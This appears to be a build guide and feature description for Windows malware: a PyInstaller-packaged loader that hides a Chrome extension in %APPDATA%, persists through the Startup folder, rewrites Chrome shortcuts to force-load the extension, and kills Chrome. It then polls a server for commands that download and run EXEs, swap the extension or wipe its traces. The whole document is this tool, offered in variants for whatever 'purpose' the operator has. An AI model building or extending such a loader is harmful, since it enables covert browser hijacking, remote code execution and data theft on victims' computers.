Build build: 
1. Installing PyInstaller: 
pip install pyinstaller

2. Building the EXE file: 
pyinstaller --onefile --add-data “extension;extension” loadwin.py

- The --add-data “extension;extension” parameter adds the extension folder to the build.
- After the build, the file loadwin.exe will appear in the dist folder.
- Install all dependencies before building 

Use the name loadwin.py / load.py / loader.py depending on your purpose. 
- loadwin.py is a full-fledged version that is installed on the system, loads the extension into chrome, waits for commands from the server and executes them.
- loader.py - the version where the extension is installed in chrome, connects to the server and executes only the restart command. 
- load.py - full analog of loadwin.py except for the warming in the system, installs the extension and waits for all commands from the server and executes them. 
- The sample build is located /scrypt/exe 
For efficient operation requires admin rights, without them works unstable. 

Functionality: 
1. At first startup, the build copies the extension folder to %APPDATA%\.hidden_extension\extension, if there is no copy there yet.

2. Creates a shortcut in the autoloader folder (%AppData%\Microsoft\Windows\Start Menu\Programs\Startup) so that it will start automatically again every time you log in.

3. searches for Google Chrome.lnk or Chrome.lnk files on the desktop and in the Start menu and Taskbar. If the shortcut points to chrome.exe, passes the --load-extension=“extension path” parameter to it.

4. Kills all Chrome processes (taskkill), waits for 3 minutes and launches chrome again with the updated shortcut via a temporary .bat.

5. Requests the server every 30 seconds, receiving commands:
     - restart_chrome - updates shortcuts and restarts Chrome.  
     - load_and_run - downloads the .exe to a temporary folder and runs it.  
     - update_extension - downloads the .zip, replaces the old extension and restarts Chrome again.  
     - delete - removes the extension, the autoload shortcut, and the .exe itself (via .bat).

6. The delete command kills Chrome, deletes the hidden folder with the extension, removes the autoloader and deletes the .exe itself via .bat.